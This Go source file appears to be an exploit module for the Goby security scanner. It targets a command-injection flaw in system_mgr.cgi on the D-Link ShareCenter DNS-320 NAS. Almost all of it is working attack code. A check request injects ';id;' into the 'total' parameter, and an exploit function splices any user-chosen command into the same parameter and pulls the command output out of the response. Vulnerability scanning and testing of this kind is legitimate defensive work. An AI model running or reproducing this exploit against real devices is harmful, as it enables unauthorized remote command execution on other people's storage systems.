package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
  "Name": "D-Link ShareCenter DNS-320 system_mgr.cgi RCE",
  "Description": "D-Link ShareCenter DNS-320 system_ There is remote command execution in mgr.cgi, and the attacker can control the server through the vulnerability",
  "Product": "D-Link ShareCenter DNS-320",
  "Homepage": "http://www.dlink.com.cn/",
  "DisclosureDate": "2021-05-28",
  "Author": "PeiQi",
  "GobyQuery": "app=\"DLink-DNS-ShareCenter\"",
  "Level": "3",
  "Impact": "<p>the attacker can control the server through the vulnerability</p>",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "Cmd",
      "type": "input",
      "value": "id"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "RCE"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "DLink-DNS-ShareCenter"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Recommandation": "<p>Update</p>"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri := "/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;id;"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "uid")
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    cmd := ss.Params["Cmd"].(string)
		    cmd = strings.Replace(cmd, " ", "%20", -1)
		    uri := "/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;" + cmd + ";"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			    if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Content"){
    			    Data := regexp.MustCompile(`([\s\S]+)Content-type: text/xml`).FindStringSubmatch(resp.Utf8Html)[1]
            		expResult.Output = Data
            		expResult.Success = true
			    }
        	}
			return expResult
		},
	))
}